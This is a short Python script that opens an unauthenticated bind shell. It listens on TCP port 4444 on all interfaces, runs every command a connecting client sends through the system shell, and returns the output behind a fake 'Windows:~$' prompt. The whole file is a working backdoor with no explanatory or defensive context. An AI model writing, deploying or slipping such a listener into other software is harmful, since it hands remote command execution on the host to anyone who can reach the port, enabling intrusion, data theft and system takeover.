from socket import *
from subprocess import Popen, PIPE


server = socket(AF_INET, SOCK_STREAM)
server.bind(('0.0.0.0', 4444))
server.listen(2)

while True:
    obj, addr = server.accept()

    
    try:
        while True:
            obj.send(b"\nWindows:~$ ")
            command = obj.recv(1024).decode().rstrip()

            shell = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            response = str(shell.stdout.read()).replace(r"\r\n", "\n")

            obj.send(response.encode())

    except:
        obj.close()